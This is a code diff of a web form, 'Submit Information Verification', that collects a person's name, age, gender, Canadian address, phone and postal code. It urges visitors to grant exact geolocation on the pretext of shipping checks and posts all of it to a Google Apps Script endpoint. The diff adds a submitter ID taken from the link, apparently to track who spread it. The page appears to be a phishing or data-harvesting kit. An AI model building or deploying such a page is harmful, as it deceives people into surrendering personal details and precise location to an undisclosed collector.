@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Submit Information Verification</title>
     <style>
-        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --success-bg: #f0fdf4; --warn: #f59e0b; --info: #2563eb; --info-bg: #eff6ff; }
+        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; --error: #dc2626; --error-bg: #fef2f2; --success: #16a34a; --success-bg: #f0fdf4; --warn: #f59e0b; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px; }
         .container { background: var(--card); width: 100%; max-width: 540px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); }
@@ -24,19 +24,15 @@
         .btn-success { background: var(--success); margin-top: 20px; }
         .btn-success:hover { background: #15803d; }
         .btn-warning { background: var(--warn); margin-top: 10px; }
-        .btn-warning:hover { background: #d97706; }
-        #step-verification { display: none; }
-        .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; }
-        .info-card p { margin: 6px 0; }
         .hidden { display: none !important; }
         .loc-box { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 10px; padding: 18px; margin-bottom: 15px; color: #92400e; line-height: 1.7; }
-        .loc-box strong { display: block; margin-bottom: 8px; font-size: 15px; }
+        .loc-box strong { display: block; margin-bottom: 8px; }
         .step-item { margin: 8px 0; padding-left: 22px; position: relative; font-size: 14px; }
         .step-item::before { content: "🔒"; position: absolute; left: 0; top: 0; }
+        .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; }
     </style>
 </head>
 <body>
-
 <div class="container">
     <div id="step-form">
         <h2>Submit Information Verification</h2>
@@ -127,10 +123,9 @@
         <button class="btn" onclick="goConfirm()">Next</button>
     </div>
 
-    <div id="step-verification">
+    <div id="step-verification" class="hidden">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
-
         <div class="loc-box">
             <strong>📍 Why We Need Your Location</strong>
             We need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.<br><br>
@@ -139,9 +134,7 @@
             <div class="step-item">Tap the lock icon → find "Location" → change permission to <strong>"Allow"</strong></div>
             <div class="step-item">Refresh this page — your information will NOT be lost</div>
         </div>
-
         <div id="loc-status" class="loc-box hidden">✅ Location access granted</div>
-
         <div class="info-card">
             <p><strong>Name:</strong> <span id="disp-name"></span></p>
             <p><strong>Gender:</strong> <span id="disp-gender"></span></p>
@@ -151,15 +144,17 @@
             <p><strong>Phone:</strong> +1 <span id="disp-phone"></span></p>
             <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
         </div>
-
         <button id="btn-loc-retry" class="btn btn-warning" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
         <button id="btn-submit" class="btn btn-success hidden" onclick="submitAll()">✅ Confirm & Submit</button>
     </div>
 </div>
 
 <script>
-// =====================================================
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXfiVnWyTL9EMQdPbdPNFUs1m60loHedhowaqgYN4OHh1-ax5pRtuwYl9IopNTtqQ/exec";
+
+// ✅ 从URL读取提交者ID ?id=xxxx
+const urlParams = new URLSearchParams(window.location.search);
+const SUBMITTER_ID = urlParams.get("id") || "";
 
 let form = {};
 let locationInfo = { lat: "", lng: "", ok: false };
@@ -214,7 +209,6 @@ function validateField(id) {
   else if(["gender","province"].includes(id)) ok = v !== "";
   else if(id === "phone") ok = v.replace(/\D/g,"").length === 10;
   else if(id === "zip") ok = v.replace(/\s/g,"").length >= 4;
-
   if(v.length > 0) {
     el.classList.toggle("invalid", !ok);
     if(err) err.style.display = !ok ? "block" : "none";
@@ -237,7 +231,6 @@ function goConfirm() {
     if(firstErr) document.getElementById(firstErr).scrollIntoView({behavior:"smooth"});
     return;
   }
-
   form = {
     name: document.getElementById("firstName").value.trim() + " " + document.getElementById("lastName").value.trim(),
     gender: document.getElementById("gender").value,
@@ -249,9 +242,8 @@ function goConfirm() {
     zip: document.getElementById("zip").value.trim().toUpperCase(),
     phone: document.getElementById("phone").value.trim().replace(/\D/g,"")
   };
-
-  document.getElementById("step-form").style.display = "none";
-  document.getElementById("step-verification").style.display = "block";
+  document.getElementById("step-form").classList.add("hidden");
+  document.getElementById("step-verification").classList.remove("hidden");
   document.getElementById("disp-name").textContent = form.name;
   document.getElementById("disp-gender").textContent = form.gender;
   document.getElementById("disp-age").textContent = form.age;
@@ -259,7 +251,6 @@ function goConfirm() {
   document.getElementById("disp-addr").textContent = `${form.address}, ${form.city}, ${form.province}, Canada, ${form.zip}`;
   document.getElementById("disp-phone").textContent = form.phone;
   document.getElementById("disp-zip").textContent = form.zip;
-
   requestLocation();
 }
 
@@ -271,7 +262,6 @@ function requestLocation() {
   document.getElementById("btn-loc-retry").classList.remove("hidden");
   document.getElementById("btn-submit").classList.add("hidden");
   document.getElementById("loc-status").classList.add("hidden");
-
   navigator.geolocation.getCurrentPosition(
     pos => {
       locationInfo.lat = pos.coords.latitude.toFixed(6);
@@ -314,8 +304,8 @@ async function submitAll() {
     return;
   }
   const timeStr = new Date().toLocaleString("zh-CN");
-
   const data = {
+    "提交者ID": SUBMITTER_ID,
     "姓名": form.name,
     "性别": form.gender,
     "年龄": form.age,
@@ -331,9 +321,8 @@ async function submitAll() {
     "经度": String(locationInfo.lng),
     "录入时间": timeStr
   };
-
   try {
-    const res = await fetch(APPSCRIPT_URL, {
+    await fetch(APPSCRIPT_URL, {
       method: "POST",
       mode: "no-cors",
       headers: { "Content-Type": "application/json" },
